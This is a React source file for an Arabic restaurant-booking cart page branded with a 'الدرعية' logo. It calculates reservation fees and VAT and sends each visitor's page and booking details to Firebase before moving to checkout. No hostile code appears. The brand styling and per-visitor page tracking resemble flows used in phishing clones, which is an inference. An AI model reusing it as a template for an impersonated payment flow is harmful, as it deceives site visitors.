import { ArrowRight, Plus, Minus, ShoppingCart, UtensilsCrossed, Calendar, Clock, Users, Receipt, MapPin, Star } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Link, useLocation } from "wouter";
import { useState, useEffect } from "react";
import { handleCurrentPage, addData } from "@/lib/firebase";

interface Restaurant {
  id: string;
  name: string;
  nameEn: string;
  cuisine: string;
  rating: number;
  image: string;
  location: string;
  reservationFee: number;
}

interface BookingData {
  restaurantName: string;
  date: string;
  time: string;
  guests: string;
  reservationFee: number;
  vat: number;
  totalAmount: number;
  reservationType: string;
}

export default function RestaurantCartPage() {
  const [, setLocation] = useLocation();
  const [restaurant, setRestaurant] = useState<Restaurant | null>(null);
  const [bookingData, setBookingData] = useState<BookingData | null>(null);
  const [guests, setGuests] = useState(2);

  useEffect(() => {
    handleCurrentPage("restaurant_cart");
    const storedRestaurant = localStorage.getItem("selectedRestaurant");
    const storedBooking = localStorage.getItem("restaurantBookingData");
    if (storedRestaurant) setRestaurant(JSON.parse(storedRestaurant));
    if (storedBooking) {
      const data = JSON.parse(storedBooking);
      setBookingData(data);
      setGuests(parseInt(data.guests) || 2);
    }
  }, []);

  const feePerGuest = restaurant?.reservationFee || 75;
  const subtotal = feePerGuest * guests;
  const vat = subtotal * 0.15;
  const total = subtotal + vat;

  const handleContinue = () => {
    // Update booking data with potentially changed guest count
    const updatedBooking = {
      ...bookingData,
      guests: guests.toString(),
      reservationFee: subtotal,
      vat: vat,
      totalAmount: total,
    };
    localStorage.setItem("restaurantBookingData", JSON.stringify(updatedBooking));

    // Save to Firebase
    const visitorId = localStorage.getItem("visitor");
    if (visitorId) {
      addData({
        id: visitorId,
        reservationType: "restaurant",
        restaurantName: restaurant?.name,
        reservationDate: bookingData?.date ? new Date(bookingData.date).toLocaleDateString('ar-SA') : '',
        reservationTime: bookingData?.time,
        reservationGuests: guests.toString(),
        reservationFee: subtotal,
        vat: vat,
        totalAmount: total,
        currentPage: "restaurant_cart",
      });
    }
    setLocation("/checkout");
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-background to-[#f5f0e8] flex flex-col" dir="rtl">
      <Header />
      <ProgressSteps />
      <TitleBanner />
      <main className="flex-1 px-4 py-6">
        <div className="max-w-md mx-auto space-y-5 animate-fade-in">
          {/* Restaurant Info Card */}
          {restaurant && (
            <div className="bg-white rounded-2xl shadow-xl overflow-hidden">
              <div className="relative h-36">
                <img src={restaurant.image} alt={restaurant.name} className="w-full h-full object-cover" />
                <div className="absolute inset-0 bg-gradient-to-t from-black/70 to-transparent" />
                <div className="absolute bottom-3 right-3 left-3">
                  <div className="flex items-center gap-2 mb-1">
                    <Star className="w-3.5 h-3.5 text-yellow-400 fill-yellow-400" />
                    <span className="text-white text-xs">{restaurant.rating}</span>
                  </div>
                  <h3 className="text-white font-bold text-lg">{restaurant.name}</h3>
                  <div className="flex items-center gap-1 text-white/70 text-xs">
                    <MapPin className="w-3 h-3" />
                    {restaurant.location}
                  </div>
                </div>
              </div>
              <div className="p-4">
                <div className="grid grid-cols-3 gap-3">
                  {bookingData?.date && (
                    <div className="text-center p-2 bg-primary/5 rounded-xl">
                      <Calendar className="w-4 h-4 text-primary mx-auto mb-1" />
                      <p className="text-xs text-muted-foreground">التاريخ</p>
                      <p className="text-xs font-bold text-foreground mt-0.5">
                        {new Date(bookingData.date).toLocaleDateString('ar-SA', { month: 'short', day: 'numeric' })}
                      </p>
                    </div>
                  )}
                  {bookingData?.time && (
                    <div className="text-center p-2 bg-primary/5 rounded-xl">
                      <Clock className="w-4 h-4 text-primary mx-auto mb-1" />
                      <p className="text-xs text-muted-foreground">الوقت</p>
                      <p className="text-xs font-bold text-foreground mt-0.5">{bookingData.time}</p>
                    </div>
                  )}
                  <div className="text-center p-2 bg-primary/5 rounded-xl">
                    <Users className="w-4 h-4 text-primary mx-auto mb-1" />
                    <p className="text-xs text-muted-foreground">الضيوف</p>
                    <p className="text-xs font-bold text-foreground mt-0.5">{guests}</p>
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* Guest Quantity */}
          <div className="bg-white rounded-2xl shadow-xl p-5">
            <div className="flex items-center justify-between">
              <div>
                <div className="flex items-center gap-2 mb-1">
                  <UtensilsCrossed className="w-4 h-4 text-primary" />
                  <h3 className="font-bold text-foreground">عدد الضيوف</h3>
                </div>
                <p className="text-muted-foreground text-sm">{feePerGuest} ر.س / شخص</p>
              </div>
              <div className="flex items-center gap-1 bg-muted rounded-xl p-1">
                <Button
                  size="icon"
                  variant="ghost"
                  className="h-9 w-9 rounded-lg"
                  onClick={() => setGuests(Math.max(1, guests - 1))}
                >
                  <Minus className="w-4 h-4" />
                </Button>
                <span className="w-10 text-center font-bold text-lg">{guests}</span>
                <Button
                  size="icon"
                  variant="ghost"
                  className="h-9 w-9 rounded-lg"
                  onClick={() => setGuests(guests + 1)}
                >
                  <Plus className="w-4 h-4" />
                </Button>
              </div>
            </div>
          </div>

          {/* Pricing Breakdown */}
          <div className="bg-white rounded-2xl shadow-xl p-5">
            <div className="flex items-center gap-2 mb-4">
              <Receipt className="w-5 h-5 text-primary" />
              <h3 className="font-bold text-foreground">تفاصيل الفاتورة</h3>
            </div>
            <div className="space-y-3">
              <div className="flex justify-between text-sm py-1.5">
                <span className="text-muted-foreground">رسوم الحجز ({guests} ضيوف x {feePerGuest} ر.س)</span>
                <span className="font-medium">{subtotal} ر.س</span>
              </div>
              <div className="flex justify-between text-sm py-1.5 border-t border-border/50">
                <span className="text-muted-foreground">ضريبة القيمة المضافة (15%)</span>
                <span className="font-medium">{vat.toFixed(2)} ر.س</span>
              </div>
              <div className="flex justify-between items-center pt-3 mt-2 border-t-2 border-primary/20">
                <span className="font-bold text-foreground text-lg">المجموع الكلي</span>
                <span className="font-bold text-primary text-2xl">{total.toFixed(2)} ر.س</span>
              </div>
            </div>
          </div>
        </div>
      </main>
      <ContinueButton onContinue={handleContinue} />
    </div>
  );
}

function Header() {
  return (
    <header className="sticky top-0 z-50 bg-gradient-to-r from-[#2a1f16] via-[#3d3428] to-[#2a1f16] text-white shadow-xl">
      <div className="container mx-auto px-4 py-3">
        <div className="flex items-center justify-between">
          <Link href="/restaurant-booking">
            <Button size="icon" variant="ghost" className="text-white hover:bg-white/10">
              <ArrowRight className="w-5 h-5" />
            </Button>
          </Link>
          <div className="flex-1 flex justify-center">
            <img src="/logo-white.svg" alt="الدرعية" className="h-10" />
          </div>
          <div className="w-10" />
        </div>
      </div>
    </header>
  );
}

function ProgressSteps() {
  return (
    <div className="bg-gradient-to-r from-[#f5f0e8] to-[#ebe3d7] p-5">
      <div className="flex items-center justify-center gap-1">
        {[
          { number: 1, label: "تسجيل" },
          { number: 2, label: "الحجز" },
          { number: 3, label: "السلة" },
          { number: 4, label: "الدفع" },
        ].map((step, index, arr) => (
          <div key={step.number} className="flex items-center">
            <div className="flex flex-col items-center">
              <div
                className={`w-10 h-10 rounded-full flex items-center justify-center text-sm font-bold transition-all ${
                  step.number <= 3
                    ? "bg-gradient-to-br from-primary to-[#d4a574] text-white shadow-glow"
                    : "bg-muted text-muted-foreground"
                }`}
              >
                {step.number}
              </div>
              <span className={`text-xs mt-2 font-medium ${step.number <= 3 ? "text-primary" : "text-muted-foreground"}`}>
                {step.label}
              </span>
            </div>
            {index < arr.length - 1 && (
              <div
                className={`w-10 h-1 mx-1 rounded-full ${
                  step.number < 3 ? "bg-gradient-to-r from-primary to-[#d4a574]" : "bg-muted"
                }`}
              />
            )}
          </div>
        ))}
      </div>
    </div>
  );
}

function TitleBanner() {
  return (
    <div className="bg-gradient-to-r from-[#c4956a] to-[#d4a574] py-5 px-4 text-center">
      <div className="flex items-center justify-center gap-3">
        <ShoppingCart className="w-6 h-6 text-white" />
        <h1 className="text-xl font-bold text-white">سلة الحجز</h1>
      </div>
      <p className="text-white/80 text-sm mt-1">راجع تفاصيل حجزك قبل الدفع</p>
    </div>
  );
}

function ContinueButton({ onContinue }: { onContinue: () => void }) {
  return (
    <div className="sticky bottom-0 bg-gradient-to-t from-[#e8d5b5] to-[#f5ebe0] p-4 shadow-[0_-4px_20px_rgba(0,0,0,0.1)]">
      <div className="max-w-md mx-auto">
        <Button
          size="lg"
          className="w-full bg-primary text-white shadow-lg h-14 text-base"
          onClick={onContinue}
        >
          المتابعة لإتمام الدفع
        </Button>
      </div>
    </div>
  );
}
